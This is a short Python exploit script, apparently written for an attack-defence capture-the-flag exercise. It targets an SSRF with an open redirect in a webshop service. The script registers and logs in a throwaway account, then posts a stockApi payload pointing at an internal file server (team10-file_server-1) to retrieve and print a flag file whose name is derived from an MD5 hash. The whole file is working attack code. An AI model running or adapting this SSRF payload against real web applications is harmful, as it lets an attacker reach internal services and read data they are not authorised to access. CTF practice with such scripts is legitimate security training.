import sys
import string
import random
import base64
import requests
import hashlib

"""

This is the exploit script for vulnerability 5 (ssrf with an open redirect)
This program takes 2 arguments:

- ip-address of webshop
- flagid for this flagstore

"""

def randomString():
    name = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(8))
    return name

def exploit(ip_shop, email):
    s = requests.Session()
    base = f"http://{ip_shop}:10100"
    flag_id = hashlib.md5(email.encode()).hexdigest()
    payload = f"/item/prevItem?path=http://team10-file_server-1:10101/file?image_name={flag_id}/flag.jpg"
    name = randomString()
    email = f"{name}@{name}.com"
    password = randomString()

    r = s.post(base + "/register", data={"email": email, "username": name, "password": password})
    if r.status_code != 200:
        print("Failed to register")
        sys.exit(1)

    r = s.post(base + "/login", data = {"email": email, "password": password})
    if r.status_code != 200:
        print("Failed to login")
        sys.exit(1)

    r = s.post(base + "/item/stock", data ={"stockApi": payload})

    flag = r.text
    print(f"FLAG IS: {flag}")

if __name__ == '__main__':
    args = sys.argv[1:]
    if len(args) != 2:
        print("Usage: python exploit5.py [SERVICE-IP-ADDRESS] [EMAIL/FLAG-ID]")
        sys.exit(1)

    ip_shop = args[0]
    email = args[1]
    exploit(ip_shop, email)
